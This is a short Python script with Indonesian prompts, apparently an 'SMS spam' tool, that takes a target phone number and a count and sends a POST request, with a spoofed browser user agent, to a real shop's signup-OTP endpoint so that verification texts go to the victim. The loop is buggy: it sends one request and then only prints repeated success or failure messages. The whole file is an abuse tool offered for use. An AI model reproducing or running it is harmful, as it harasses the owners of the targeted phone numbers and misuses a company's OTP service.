import os, sys, time, requests
from requests import post

def lagi():
        l = input('Mau Spam Lagi? [y/n]:')
        if l == 'y':
                main()
        elif l == 'n':
                sys.exit()







def main():
        os.system('clear')
        banner = '''
+=================================================+
[-] Author: bagosD64
[-]Youtube: bagos D64
[-]github :https;//gitub/bagosD64-blip
'''



        print(banner)
        no = input('Target : ')
        jml = int(input('jumlah spam : '))

        ua = {
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36',
        'Referer':  'https://www.mapclub.com/id/user/signup',
        }


        dat = {
        'phone': no,
        }


        sendSpam = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)


        for x in range(jml):
              time.sleep(20)
              if 'error' in sendSpam.text:
                      print('Spam Sms' + no + '[Gagal]')

              else:
                      print('Spam Sms' + no + '[Success]')



main()
lagi()
